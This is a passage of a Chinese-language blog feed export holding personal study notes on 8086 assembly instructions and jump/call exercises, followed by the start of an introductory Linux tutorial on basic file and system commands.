<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD AX,X</span><br><span class="line">ADD AL,0A4H			;十六进制开头如果是A~F，需在开头加上一个数字0，不占位</span><br></pre></td></tr></table></figure></div>

<h3 id="ADC带进位加指令"><a href="#ADC带进位加指令" class="headerlink" title="ADC带进位加指令"></a>ADC带进位加指令</h3><p>格式：ADC	DEST,	SCR</p>
<p>功能：将源操作数SCR和目的操作数DEST以及进位标志CF位相加，结果存入DEST中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADC BX,9F88H</span><br><span class="line">ADC AX,208AH</span><br></pre></td></tr></table></figure></div>

<h3 id="XADD交换加法指令"><a href="#XADD交换加法指令" class="headerlink" title="XADD交换加法指令"></a>XADD交换加法指令</h3><p>格式：XADD	DEST,	SCR</p>
<p>功能：将源操作数SCR和目的操作数DEST相加，结果存入DEST中，原来的目的操作数DEST放入源操作数SRC中</p>
<p>DEST+SCR—&gt;DEST,    原DEST—&gt;SCR</p>
<h3 id="INC自增指令"><a href="#INC自增指令" class="headerlink" title="INC自增指令"></a>INC自增指令</h3><p>格式：INC 	DEST</p>
<p>功能：将目的操作数DEST自身增加1，结果存入DEST中，即DEST&lt;-DEST+1</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">INC SI</span><br></pre></td></tr></table></figure></div>

<p>注：INC指令对CF进位标志位无影响</p>
<h3 id="SUB减法指令"><a href="#SUB减法指令" class="headerlink" title="SUB减法指令"></a>SUB减法指令</h3><p>格式：SUB	DEST,	SRC</p>
<p>功能：将目的操作数DEST内容减去源操作数SRC内容，结果输入DEST中，即DEST&lt;-DEST-SRC</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUB EAX,EBX	;CF=1	EAX=00000034H	EBX=00000052H</span><br><span class="line">;结果为EAX=FFFFFFE2H		CF=1</span><br></pre></td></tr></table></figure></div>

<h3 id="SBB带借位减法"><a href="#SBB带借位减法" class="headerlink" title="SBB带借位减法"></a>SBB带借位减法</h3><p>格式：SBB	DEST,	SRC</p>
<p>功能：将目的操作数DEST内容减去源操作数SRC内容及CF位，结果输入DEST中，即DEST&lt;-DEST-SRC-CF</p>
<p>说明：SBB指令主要用于大于16位的多精度的减法，把低位部分相减的借位引入高位部分的减法中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SBB AX, BX;CF=1		AX=4037H		BX=2342H</span><br><span class="line">;结果为AX=1CF4H		CF=0</span><br></pre></td></tr></table></figure></div>

<h3 id="DEC自减指令"><a href="#DEC自减指令" class="headerlink" title="DEC自减指令"></a>DEC自减指令</h3><p>格式：DEC	DEST</p>
<p>格式：将目的操作数DEST自身减1，结果存入DEST中，即DEST&lt;-DEST-1</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEC SI</span><br></pre></td></tr></table></figure></div>

<h3 id="CMP比较指令"><a href="#CMP比较指令" class="headerlink" title="CMP比较指令"></a>CMP比较指令</h3><p>格式：CMP	DEST,	SRC</p>
<p>功能：目的操作数DEST减去源操作数SRC，即DEST-SRC</p>
<p>说明：CMP比较指令将两个操作数相减，但相减的结果并不保留，两个操作数都保留原值不变，只是将相减的结果的特征反应在各个状态标志位上。</p>
<blockquote>
<p><strong>执行CMP指令后，如果标志位ZF&#x3D;1，说明被比较的两个数相等；</strong></p>
<p><strong>两个数的大小查看CF标志位，如果标志位CF&#x3D;1，说明出现借位，SRC更大；</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMP AX,BX		;AX-BX</span><br><span class="line">JE	NEXT		;JE表示如果两个数相等，即AX=BX，则跳转至标号NEXT</span><br><span class="line">;JE[Jump Equal]</span><br></pre></td></tr></table></figure></div>

<table>
<thead>
<tr>
<th>条件</th>
<th>大于</th>
<th>小于</th>
<th>等于</th>
</tr>
</thead>
<tbody><tr>
<td>带符号数</td>
<td>G</td>
<td>L</td>
<td>E</td>
</tr>
<tr>
<td>无符号数</td>
<td>A</td>
<td>B</td>
<td>E</td>
</tr>
</tbody></table>
</blockquote>
<h3 id="NEG取补指令"><a href="#NEG取补指令" class="headerlink" title="NEG取补指令"></a>NEG取补指令</h3><p>格式：NEG	DEST</p>
<p>功能：零0减去目的操作数DEST，结果存入目的操作数DEST,即DEST&lt;—0-DEST</p>
<p>说明：NEG指令是求操作数的负数，即改变操作数的符号，这对带符号数即为求其补码。NEG对标志位的影响：如果被取补的操作数非0，NEG操作后，CF置1，否则CF&#x3D;0;</p>
<h3 id="MUL无符号数乘法指令"><a href="#MUL无符号数乘法指令" class="headerlink" title="MUL无符号数乘法指令"></a>MUL无符号数乘法指令</h3><p>格式：MUL	SRC</p>
<p>功能：若SRC为字节长度，则AX&lt;—AL*SRC;若SRC为字长度，则DX:AX&lt;—AX*SRC[EAX&lt;—AX*SRC]</p>
<p>说明：乘法指令格式中只出现源操作数SRC，根据操作数的类型决定是8位乘法还是16位乘法。<u><strong>SRC不能是立即数(立即数无类型属性)</strong></u>，目的操作数（被乘数）隐含约定为累加器AL(8位乘)或AX(16位乘)，运算结果约定在AX(8位乘法的积)或EAX(16位乘法的积)</p>
<blockquote>
<p>若乘积的高半部全为0，则CF&#x3D;OF&#x3D;0</p>
<p>若乘积的高半部不全为0，则CF&#x3D;OF&#x3D;1</p>
</blockquote>
<h3 id="IMUL带符号数乘法指令"><a href="#IMUL带符号数乘法指令" class="headerlink" title="IMUL带符号数乘法指令"></a>IMUL带符号数乘法指令</h3><p>格式：IMUL	SRC</p>
<p>功能：若SRC为字节长度，则AX&lt;—AL*SRC;若SRC为字长度，则DX:AX&lt;—AX*SRC[EAX&lt;—AX*SRC]</p>
<p>说明： 乘法指令只影响进位标志位CF和溢出标志位OF。对于MUL，如果乘积的高半部(8位乘时为AH，16位乘时为DX)为零0，CF&#x3D;0，OF&#x3D;0；否则CF&#x3D;OF&#x3D;1(表示AH或DX中有乘积的有效数字)。若积的高半部是低半部的符号扩展，则CF&#x3D;OF&#x3D;0，否则CF&#x3D;OF&#x3D;1；</p>
<h3 id="DIV无符号数除法指令和IDIV带符号数除法指令"><a href="#DIV无符号数除法指令和IDIV带符号数除法指令" class="headerlink" title="DIV无符号数除法指令和IDIV带符号数除法指令"></a>DIV无符号数除法指令和IDIV带符号数除法指令</h3><p>格式：DIV	SRC；IDIV	SRC</p>
<p>div 是除法指令，使用div 做除法的时候注意以下问题</p>
<p>**<u>要求被除数默认存放在ax,或者dx和ax中，而且要求被除数的位数，必须是除数的2倍</u>**，比如说，除数位8位，被除数就为16位。为什么被除数的位数一定要为除数的2倍呢？</p>
<blockquote>
<p>因为CPU只会做加法运算，把其它一切的算法都转换成加法，比如说，除数 就先转换加法，例如36&#x2F;6  当CPU看到这个运算时，就会这样想，需要多少个6 相加才能得到36呢，然后CPU就从1个6 ，2个6………..这样一种算下去，终于最后发现原来是6个6啊，从这我们可以看出，CPU是不断的用除数相加，知道找到结果为止，这就出现问题了，如果被除数不是除数位数的2倍，再相加的过程中，就可能超出除数的位数所能表达的最大数值，从而越界，如果能保证 被除数是除数的2倍 ，这问题就能解决了，例如：8 &#x2F;5   5+ 5 &#x3D;10 超出所能表达的位数，08 &#x2F;5 就可以解决这个问题</p>
</blockquote>
<ol>
<li>除数：有8位和16位两种，在一个REG或者内存单元中</li>
<li>被除数：默认放在AX或者 DX和AX中，<strong>如果除数为8位，被除数为16位，默认在AX中存放；<u>如果除数为16位，被除数为32位，在DX和AX中存放，DX存高16位，AX存低16位</u></strong></li>
<li>商：如果除数为8位，AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，AX存储除法操作的商，DX存储除法操作的余数</li>
</ol>
<h3 id="CWB字扩展指令"><a href="#CWB字扩展指令" class="headerlink" title="CWB字扩展指令"></a>CWB字扩展指令</h3><p>格式：CWB</p>
<p>功能：对AL中的带符号数进行符号扩展。若AL&lt;0,AH &#x3D;0FFH,否则AH&#x3D;0.</p>
<blockquote>
<table>
<thead>
<tr>
<th>扩展指令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>CWB</td>
<td>AL符号扩展到AH中每一位，</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
</blockquote>
<h2 id="8-7-伪指令dd"><a href="#8-7-伪指令dd" class="headerlink" title="8.7.伪指令dd"></a>8.7.伪指令dd</h2><p>db 和 dw 定义字节型数据和字型数据，dd 用来定义dword（double world，双字）型数据</p>
<h2 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604634131753.png" alt="1604634131753"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604634144346.png" alt="1604634144346"></p>
<h1 id="9-转义指令"><a href="#9-转义指令" class="headerlink" title="9.转义指令"></a>9.转义指令</h1><h2 id="9-1-操作符-offset"><a href="#9-1-操作符-offset" class="headerlink" title="9.1.操作符 offset"></a>9.1.操作符 offset</h2><blockquote>
<p>功能：取得标号的偏移地址</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604906127084.png" alt="1604906127084"></p>
<p>上图的案例：取得标号start和s的偏移地址为0和3</p>
<h2 id="9-2-根据位移进行转移的jmp指令"><a href="#9-2-根据位移进行转移的jmp指令" class="headerlink" title="9.2.根据位移进行转移的jmp指令"></a>9.2.根据位移进行转移的jmp指令</h2><blockquote>
<p>jmp short 标号(转到标号处执行指令)</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604908133361.png" alt="1604908133361"></p>
<h2 id="9-3-转移的目的地址在指令中的jmp指令"><a href="#9-3-转移的目的地址在指令中的jmp指令" class="headerlink" title="9.3.转移的目的地址在指令中的jmp指令"></a>9.3.转移的目的地址在指令中的jmp指令</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604990737283.png" alt="1604990737283"></p>
<p>将跳转到<strong>CS:IP</strong>所在的地址</p>
<h2 id="9-4-转移指令在寄存器中的jmp指令"><a href="#9-4-转移指令在寄存器中的jmp指令" class="headerlink" title="9.4.转移指令在寄存器中的jmp指令"></a>9.4.转移指令在寄存器中的jmp指令</h2><blockquote>
<p>指令格式：jmp 16 位 reg</p>
<p>功能：(IP)&#x3D;（16位reg）</p>
</blockquote>
<h2 id="9-5-转移指令在内存中jmp指令"><a href="#9-5-转移指令在内存中jmp指令" class="headerlink" title="9.5.转移指令在内存中jmp指令"></a>9.5.转移指令在内存中jmp指令</h2><blockquote>
<p>jmp word ptr 内存单元地址（段内转移）</p>
</blockquote>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br><span class="line">执行后，（IP）=0123H</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>jmp dword ptr 内存单元地址（段间转移）</p>
</blockquote>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br><span class="line"></span><br><span class="line">执行后，（cs）=0,（IP）=0123H，CS:IP指向0000:0123</span><br></pre></td></tr></table></figure></div>

<h2 id="9-6-jcxz指令"><a href="#9-6-jcxz指令" class="headerlink" title="9.6.jcxz指令"></a>9.6.jcxz指令</h2><blockquote>
<p>当（cx）不等于0时，什么也不做，程序向下执行</p>
<p>当cx&#x3D;&#x3D;0，jmp short 标号；</p>
</blockquote>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">补全编程，利用jcxz指令，实现在内存2000H段中查找第一个值为0的字节，找到后，将它的偏移地址存贮在dx中。</span></span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start: mov ax,2000h</span><br><span class="line"> mov ds,ax</span><br><span class="line"> mov bx,0</span><br><span class="line"> s: mov cl, [bx]  # 注意需要保存字节</span><br><span class="line"> mov ch,0</span><br><span class="line"> jcxz ok</span><br><span class="line"> inc bx</span><br><span class="line"> jmp short s</span><br><span class="line"> ok:mov dx,bx</span><br><span class="line"> mov ax,4c00h</span><br><span class="line"> int 21h</span><br><span class="line">code ends</span><br><span class="line">end star</span><br></pre></td></tr></table></figure></div>

<h2 id="9-7-loop指令"><a href="#9-7-loop指令" class="headerlink" title="9.7.loop指令"></a>9.7.loop指令</h2><blockquote>
<p>loop指令位循环指令，为短转移，相当于</p>
<p>(cx)–</p>
<p>if ((cx)≠0) jmp short 标号；</p>
</blockquote>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">;************************************************************</span><br><span class="line">;利用loop指令,实现在内存2000H段中查找第一个值为零的byte,找到后 </span><br><span class="line">;将它的偏移地址存储到dx中 </span><br><span class="line">;************************************************************* </span><br><span class="line">assume cs:code </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line"></span><br><span class="line">start: </span><br><span class="line">   mov ax,2000H</span><br><span class="line">   mov ds,ax</span><br><span class="line">   mov bx,0</span><br><span class="line">s: </span><br><span class="line">   mov cl,[bx]</span><br><span class="line">   mov ch,0</span><br><span class="line">   inc cx      # 当cx为0，然后加一</span><br><span class="line">   inc bx</span><br><span class="line">   loop s     # 这边会减一，然后当cx等于0 就会直接跳到下一步ok</span><br><span class="line">ok: </span><br><span class="line">   dec bx</span><br><span class="line">   mov dx,bx</span><br><span class="line"></span><br><span class="line">   mov ax,4c00h</span><br><span class="line">   int 21h</span><br><span class="line"></span><br><span class="line">code ends </span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>

<h1 id="10-CALL和RET指令"><a href="#10-CALL和RET指令" class="headerlink" title="10.CALL和RET指令"></a>10.CALL和RET指令</h1><h2 id="10-1-ret和retf指令"><a href="#10-1-ret和retf指令" class="headerlink" title="10.1.ret和retf指令"></a>10.1.ret和retf指令</h2><blockquote>
<p>CPU执行ret指令，相当于<strong>pop IP</strong></p>
<p>CPU执行retf指令，相当于<strong>pop IP 和 pop CS</strong></p>
</blockquote>
<p>监测点：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">补全程序，实现从内存1000：0000处开始执行指令。</span><br><span class="line"></span><br><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">	db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start: mov ax,stack</span><br><span class="line">	   mov ss,ax</span><br><span class="line">	   mov sp,16</span><br><span class="line">	   mov ax,1000h</span><br><span class="line">	   push ax</span><br><span class="line">	   mov ax,0</span><br><span class="line">	   push ax</span><br><span class="line">	   retf</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>

<h2 id="10-2-根据位移进行转移的call指令"><a href="#10-2-根据位移进行转移的call指令" class="headerlink" title="10.2.根据位移进行转移的call指令"></a>10.2.根据位移进行转移的call指令</h2><blockquote>
<p>CPU执行call 标号，相当于进行</p>
<ul>
<li>push IP</li>
<li>jmp near ptr 标号</li>
</ul>
</blockquote>
<p>检测点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下面程序执行后，ax中的数值是多少？</span><br><span class="line">1000：0 	mov ax,0		;读取此条指令后IP=3 ，执行完该指令后IP=3</span><br><span class="line">1000：3 	call s			;读取此条指令后IP=6 ，所以IP=6入栈，执行完该指令后IP=7，跳转到s处</span><br><span class="line">1000：6 	inc ax</span><br><span class="line">1000：7 	s:pop ax		；所以POP后，ax=6</span><br></pre></td></tr></table></figure></div>

<h2 id="10-3-转移目的地址在指令中的call指令"><a href="#10-3-转移目的地址在指令中的call指令" class="headerlink" title="10.3.转移目的地址在指令中的call指令"></a>10.3.转移目的地址在指令中的call指令</h2><blockquote>
<p>call far ptr 标号：实现段间转移。相当于进行如下操作</p>
<p>push CS</p>
<p>push IP</p>
<p>jmp far ptr 标号</p>
</blockquote>
<p>监测点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">下面程序执行后,ax中的数值为多少?</span><br><span class="line"></span><br><span class="line">内存地址	             机器码	                  汇编指令</span><br><span class="line">1000:0	             b8 00 00                 mov ax,0</span><br><span class="line">1000:3               9a 09 00 00 10           call far ptr s </span><br><span class="line">1000:8               40                       inc ax</span><br><span class="line">1000:9               58                     s:pop ax</span><br><span class="line">                                              add ax,ax  * 8h+8h=10h</span><br><span class="line">                                              pop bx</span><br><span class="line">                                              add ax,bx  * 1000h+10h=1010h</span><br><span class="line"></span><br><span class="line">call far ptr s :此时IP为8h push 1000h push 8h</span><br></pre></td></tr></table></figure></div>

<h2 id="10-4-转移地址在寄存器中的call指令"><a href="#10-4-转移地址在寄存器中的call指令" class="headerlink" title="10.4.转移地址在寄存器中的call指令"></a>10.4.转移地址在寄存器中的call指令</h2><blockquote>
<p>指令格式：call 16位 reg</p>
<p>功能：</p>
<ul>
<li>push IP</li>
<li>jmp 16 位 reg</li>
</ul>
</blockquote>
<p>检测点</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">这儿用到了bp，除了之前这样用过bp外 [bx+bp] ，还会在栈中用到。</span><br><span class="line">比如说，堆栈中压入了很多数据或者地址，你肯定想通过SP来访问这些数据或者地址，但SP是要指向栈顶的，是不能随便乱改的，这时候你就需要使用BP，把SP的值传递给BP，通过BP来寻找堆栈里数据或者地址</span><br><span class="line"></span><br><span class="line">1000:0    mov ax,6</span><br><span class="line">1000:2    call ax	;相当于push IP=5 ,jmp ax=6 ,此指令未改变CS的值</span><br><span class="line">1000:5    inc ax	;未执行</span><br><span class="line">1000:6    mov bp,sp</span><br><span class="line">          add ax,[bp]	;相当于add ax,[sp],默认段地址ss，所以即把栈顶元素弹出和AX相加6+5=11=BH</span><br></pre></td></tr></table></figure></div>

<h2 id="10-5-转移地址在内存中的call指令"><a href="#10-5-转移地址在内存中的call指令" class="headerlink" title="10.5.转移地址在内存中的call指令"></a>10.5.转移地址在内存中的call指令</h2><blockquote>
<p>call word ptr 内存单元地址，相当于进行：</p>
<p>push IP</p>
<p>jmp word ptr 内存单元地址</p>
</blockquote>
<p>实例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov sp,10h,</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br><span class="line"></span><br><span class="line">执行后，IP=0123h，sp=10h-2=0Eh</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>call dword ptr 内存单元地址，相当于进行：</p>
<p>push CS</p>
<p>push IP</p>
<p>jmp dwod ptr 内存单元地址</p>
</blockquote>
<p>实例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br><span class="line"></span><br><span class="line">执行后，cs=0 IP=0123h sp=10h-4=0Ch</span><br></pre></td></tr></table></figure></div>

<p>检测点</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1605247814500.png" alt="1605247814500"></p>
<hr>
<hr>
<h1 id="参考书籍"><a href="#参考书籍" class="headerlink" title="参考书籍"></a>参考书籍</h1><p><a class="link" href="https://kingwempity.github.io/PDF/Assembly_Languages_BY_ShuangWang.pdf">《汇编语言(第3版) 》王爽著.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <tags>
        <tag>汇编语言</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Java实战</title>
    <url>/2024/02/07/Java%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux——基础</title>
    <url>/2024/04/16/Linux%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="linux系统入门："><a href="#linux系统入门：" class="headerlink" title="linux系统入门："></a>linux系统入门：</h1><h2 id="1-操作系统介绍"><a href="#1-操作系统介绍" class="headerlink" title="1.操作系统介绍"></a>1.操作系统介绍</h2><p>软件：驱动硬件</p>
<p>硬件：看得见，摸得着</p>
<p>操作系统：特殊的软件，控制硬件，内核+软件 </p>
<p>操作系统：</p>
<p>unix(1969年诞生于贝尔实验室)</p>
<p>硬件-系统(hp-ux)-软件</p>
<p>BSD:  freeBSD  黑莓</p>
<p>ios，mac os，<em>苹果</em>的 第一代 操作系统于1984年 发布</p>
<p>ms-dos  单任务</p>
<p>window 1.0  1985年发布  windows NT</p>
<p>开源  闭源</p>
<p>minix</p>
<p>linux:  1991年  林纳斯.托瓦兹 linux内核 1.0&#x2F;GPL</p>
<p>现在的操作系统：多任务，多用户</p>
<p>GNU:  贡献了很多免费使用的软件</p>
<p>GPL 协议</p>
<p>gnu&#x2F;linux:</p>
<p>中科麒麟</p>
<p>linux发行版：</p>
<p>linux内核</p>
<p>红帽redhat ： fedora   centos  最稳定企业服务器操作系统centos6 2.6.32 centos7  3.10  centos8 4.10</p>
<p>debian： ubuntu  kali  国产linux   内核 5.10 版本新 人工智能 自动驾驶 大数据</p>
<p>suse： opensuse  suse企业版</p>
<h2 id="2-centos系统的安装"><a href="#2-centos系统的安装" class="headerlink" title="2.centos系统的安装"></a>2.centos系统的安装</h2><p>ios镜像下载地址：</p>
<p><a class="link" href="https://mirrors.tuna.tsinghua.edu.cn/centos-vault/7.8.2003/isos/x86_64/CentOS-7-x86_64-DVD-2003.iso">https://mirrors.tuna.tsinghua.edu.cn/centos-vault/7.8.2003/isos/x86_64/CentOS-7-x86_64-DVD-2003.iso <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>install 安装</p>
<p>test</p>
<p>media 媒体 媒介 光盘</p>
<p>lvm：逻辑卷</p>
<p>el7:  enterprise linux 7</p>
<p>linux远程控制：</p>
<p>telnet协议： 明文</p>
<p>ssh协议： 加密</p>
<h2 id="3-远程连接linux"><a href="#3-远程连接linux" class="headerlink" title="3.远程连接linux"></a>3.远程连接linux</h2><p>第一步：查看ip地址  ip addr</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远程登录linux系统</span></span><br><span class="line">ssh  root@192.168.202.136</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">断开连接</span></span><br><span class="line">exit</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启系统</span></span><br><span class="line">reboot</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立即关机</span></span><br><span class="line">shutdown  -h  now</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">十分钟之后关机</span></span><br><span class="line">shutdown  -h  10</span><br></pre></td></tr></table></figure></div>



<h2 id="4-文件操作"><a href="#4-文件操作" class="headerlink" title="4.文件操作"></a>4.文件操作</h2><p>命令1：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换目录</span></span><br><span class="line">cd  #全称change directory</span><br><span class="line">例子1：</span><br><span class="line">cd  local    #切换到子目录local</span><br><span class="line">cd  /usr/local  #切换到目录/usr/local</span><br><span class="line">cd  ..       #切换到上一级目录</span><br></pre></td></tr></table></figure></div>

<p>命令2：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">print</span> work directory</span></span><br><span class="line">pwd</span><br></pre></td></tr></table></figure></div>

<p>命令3：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">新建文件</span></span><br><span class="line">touch</span><br><span class="line">例子1： touch 1.txt  #创建单个文件</span><br><span class="line">例子2： touch test&#123;01..10&#125;.txt #批量创建文件</span><br><span class="line">例子3： touch /root/4.txt  #在制定的/root目录下，创建文件4.txt</span><br></pre></td></tr></table></figure></div>

<p>命令4：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看目录下的文件</span></span><br><span class="line">ls全称list</span><br><span class="line">例子1：ls  test09.txt   #查看test09.txt是否存在</span><br><span class="line">例子2：ls  *.txt        #查看以txt结尾的所有文件</span><br><span class="line">例子3：ls  -1           #以一行一个文件的方式显示</span><br><span class="line">例子4：ls  -a           #查看所有文件，包括隐藏文件</span><br><span class="line">例子5：ls -a -1         #查看所有文件，以一行一个来显示</span><br><span class="line">例子6：ls -l            #以长格式查看文件</span><br></pre></td></tr></table></figure></div>

<p>以.开头的文件是隐藏文件，默认不显示</p>
<p>命令5：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重命名</span></span><br><span class="line">mv全称move</span><br><span class="line">例子1：mv .123.txt 123.txt   #将.123.txt文件重命名为123.txt</span><br><span class="line">例子2：mv 123.txt /opt       #将当前目录下的123.txt移动到/opt目录下</span><br></pre></td></tr></table></figure></div>

<p>命令6：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制</span></span><br><span class="line">cp全称copy</span><br><span class="line">例子1：cp test01.txt /opt/   #将当前目录下的test01.txt复制到/opt目录下</span><br><span class="line">例子2：cp -a dev04 /opt/     #将目录dev04复制到/opt下</span><br></pre></td></tr></table></figure></div>

<p>命令7：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除</span></span><br><span class="line">例子1:  rm /opt/123.txt  #将/opt目录下的123.txt文件删除，需要回复y确认删除</span><br><span class="line">例子2： rm -f /opt/test01.txt #将/opt目录下的test01.txt文件删除，不需要回复</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除一个目录，linux的参数大部分没有先后顺序</span></span><br><span class="line">[root@localhost ~]# rm -fr dev</span><br><span class="line">[root@localhost ~]# rm -rf dev01</span><br><span class="line">[root@localhost ~]# rm -f -r dev02</span><br><span class="line">[root@localhost ~]# rm -r -f dev03</span><br></pre></td></tr></table></figure></div>

<p>命令8：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建文件夹 创建目录directory</span></span><br><span class="line">mkdir 全称make directory </span><br><span class="line">例子1：mkdir dev   #创建一个dev目录</span><br><span class="line">例子2：mkdir dev&#123;01..10&#125;     #批量创建多个目录</span><br><span class="line">例子3：mkdir -p 1/2/3/4/5/6  #一次性创建多级子目录</span><br></pre></td></tr></table></figure></div>

<p>命令9：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">vi编辑器</span></span><br><span class="line">例子1： vi  test03.txt   #编辑文件test03.txt</span><br><span class="line">默认是常规模式，按ioa键进入编辑模式</span><br><span class="line">在编辑模式中按esc回到常规模式</span><br><span class="line">常规模式按:进入命令模式</span><br><span class="line">命令模式按esc回到常规模式</span><br></pre></td></tr></table></figure></div>



<p>命令10：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从上往下顺序查看文本内容</span></span><br><span class="line">cat</span><br><span class="line">例子1：cat  test03.txt  #查看test03.txt的全部内容</span><br><span class="line">例子2：cat -n test03.txt #查看内容的时候显示行号</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从下往上倒着查看文本内容</span></span><br><span class="line">tac</span><br><span class="line">例子1：tac  test03.txt  #倒着查看test03.txt的全部内容</span><br></pre></td></tr></table></figure></div>

<p>命令11：</p>
